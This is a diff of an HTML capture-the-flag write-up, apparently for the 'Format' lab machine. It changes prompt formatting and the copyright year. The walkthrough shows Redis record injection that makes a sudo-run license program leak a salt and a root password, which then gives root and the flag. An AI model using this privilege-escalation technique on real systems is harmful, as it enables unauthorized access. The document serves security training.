 <span class="n">User</span> <span class="n">does</span> <span class="ow">not</span> <span class="n">exist</span><span class="o">.</span> <span class="n">Please</span> <span class="n">provide</span> <span class="n">valid</span> <span class="n">username</span><span class="o">.</span>
 
-<span class="nd">@cooper@format</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
+<span class="nd">cooper@format</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
 </pre></div>
 
 Let's try adding the user <code>elswix</code> through Redis:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@cooper@format</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">redis</span><span class="o">-</span><span class="n">cli</span> <span class="o">-</span><span class="n">s</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">redis</span><span class="o">/</span><span class="n">redis</span><span class="o">.</span><span class="n">sock</span>
+<div class="highlight"><pre><span></span><span class="nd">cooper@format</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">redis</span><span class="o">-</span><span class="n">cli</span> <span class="o">-</span><span class="n">s</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">redis</span><span class="o">/</span><span class="n">redis</span><span class="o">.</span><span class="n">sock</span>
 <span class="n">redis</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">redis</span><span class="o">/</span><span class="n">redis</span><span class="o">.</span><span class="n">sock</span><span class="o">&gt;</span>
 </pre></div>
 
@@ -490,7 +490,7 @@ We can add it using the <code>HMSET</code> command:<br/><br/>
 </pre></div>
 
 Now, when executing the same command with sudo:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@cooper@format</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">sudo</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">license</span> <span class="o">-</span><span class="n">p</span> <span class="n">elswix</span>
+<div class="highlight"><pre><span></span><span class="nd">cooper@format</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">sudo</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">license</span> <span class="o">-</span><span class="n">p</span> <span class="n">elswix</span>
 
 <span class="n">Plaintext</span> <span class="n">license</span> <span class="n">key</span><span class="p">:</span>
 <span class="o">------------------------------------------------------</span>
@@ -500,7 +500,7 @@ Now, when executing the same command with sudo:<br/><br/>
 <span class="o">------------------------------------------------------</span>
 <span class="n">gAAAAABlGa55Ei1j2RSdPvbwaaXJzMC2L1aLRyRami9bizj2cTzVsGI2Nafo</span><span class="o">-</span><span class="n">pNqSjfyLe3SSreJLzJsD7186CvyMJcy5ZKM1eWkWIm72oKmmC74JWgAYN_gl7LxFhpIWAN2ypdMDU2XNBaVLS</span><span class="o">-</span><span class="n">pjvHH9e7ILbglay4SATvztnsJ4WZzgfbG</span><span class="o">-</span><span class="mi">04</span><span class="o">=</span>
 
-<span class="nd">@cooper@format</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
+<span class="nd">cooper@format</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
 </pre></div>
 
 We see that we are correct, and we can control what is stored in the variables. Knowing this, we can attempt to access variables defined in the program.<br/><br/>
@@ -512,7 +512,7 @@ Remember that we need to change the value of some of the fields that are display
 </pre></div>
 
 Now, if I try to execute the program:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@cooper@format</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">sudo</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">license</span> <span class="o">-</span><span class="n">p</span> <span class="n">elswix1</span>
+<div class="highlight"><pre><span></span><span class="nd">cooper@format</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">sudo</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">license</span> <span class="o">-</span><span class="n">p</span> <span class="n">elswix1</span>
 
 <span class="n">Plaintext</span> <span class="n">license</span> <span class="n">key</span><span class="p">:</span>
 <span class="o">------------------------------------------------------</span>
@@ -522,7 +522,7 @@ Now, if I try to execute the program:<br/><br/>
 <span class="o">------------------------------------------------------</span>
 <span class="n">gAAAAABlGa8qJfE91BdIPgImJcqKixVukvjw844HS2ITaHqGCEjF0yIeasPJo7bIY3ITOcVH3xAUNUzx6nfykSNlyRVa250XuHMpuQ_pBEEjHwNVHnFeLTB</span><span class="o">-</span><span class="mf">3E4</span><span class="n">qCJ7</span><span class="o">-</span><span class="mi">3</span><span class="n">T0SXh8dk_1IOj7_Uutzi2rPgSiixPJ8quEducf9FHrVgNniqfXguAqJAAS</span><span class="o">-</span><span class="n">NsPrV97WOiXa4wM6</span>
 
-<span class="nd">@cooper@format</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
+<span class="nd">cooper@format</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
 </pre></div>
 
 We see the value of the <code>salt</code> variable, which is <code>microblogsalt123</code>.<br/><br/>
@@ -534,7 +534,7 @@ In my case, I will focus on the <code>secret_encoded</code> variable as it will 
 </pre></div>
 
 Once again, we try to execute the program:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@cooper@format</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">sudo</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">license</span> <span class="o">-</span><span class="n">p</span> <span class="n">elswix2</span>
+<div class="highlight"><pre><span></span><span class="nd">cooper@format</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">sudo</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">license</span> <span class="o">-</span><span class="n">p</span> <span class="n">elswix2</span>
 
 <span class="n">Plaintext</span> <span class="n">license</span> <span class="n">key</span><span class="p">:</span>
 <span class="o">------------------------------------------------------</span>
@@ -544,27 +544,27 @@ Once again, we try to execute the program:<br/><br/>
 <span class="o">------------------------------------------------------</span>
 <span class="n">gAAAAABlGbCHM</span><span class="o">-</span><span class="n">PvcoDTv1oxmO</span><span class="o">-</span><span class="mi">7</span><span class="n">sr5Wi7w7M_wxiERGuDt814ENoTZi7UoENeC</span><span class="o">-</span><span class="n">yRJpfzm7u4wxGnIKGRfsyqmZNQfv9VQiaAugEevkcYhLjORImzj4ASxocszr24jF_KU5d5UUDh9HM</span><span class="o">-</span><span class="n">U7thUul24SBN</span><span class="o">-</span><span class="n">k0P5Z7AU3X3Rhb_EAhjxHWz</span><span class="o">-</span><span class="n">GpScM18CnZ9BHjB249o1cX5ET</span>
 
-<span class="nd">@cooper@format</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
+<span class="nd">cooper@format</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
 </pre></div>
 
 As we can see, the string <code>unCR4ckaBL3Pa$$w0rd</code> was displayed. This appears to be a password that we can copy and try to use to escalate to the <code>root</code> user.<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@cooper@format</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">su</span>
+<div class="highlight"><pre><span></span><span class="nd">cooper@format</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">su</span>
 <span class="n">Password</span><span class="p">:</span> 
-<span class="nd">@root@format</span><span class="p">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">cooper</span><span class="root1">#</span>
+<span class="nd">root@format</span><span class="p">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">cooper</span><span class="root1">#</span>
 </pre></div>
 
 The password we obtained by displaying the value of the <code>secret</code> variable corresponds to the system-level <code>root</code> user's password.<br/><br/>
 Finally, we can read the last flag:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@root@format</span><span class="p">:</span><span class="o">~</span><span class="root1">#</span><span class="n"> cat root.txt</span>
+<div class="highlight"><pre><span></span><span class="nd">root@format</span><span class="p">:</span><span class="o">~</span><span class="root1">#</span><span class="n"> cat root.txt</span>
 <span class="mi">1</span><span class="n">bd03</span><span class="o">**********************</span><span class="mi">1</span><span class="n">d68d</span>
-<span class="nd">@root@format</span><span class="p">:</span><span class="o">~</span><span class="root1">#</span>
+<span class="nd">root@format</span><span class="p">:</span><span class="o">~</span><span class="root1">#</span>
 </pre></div></br></br></br></br></br></br></br></br>
             </div>
         </div>
     </section>
 
     <footer>
-        <p>&copy; 2023 elswix.github.io</p>
+        <p>&copy; 2024 elswix.github.io</p>
     </footer>
 </body>
 </html>
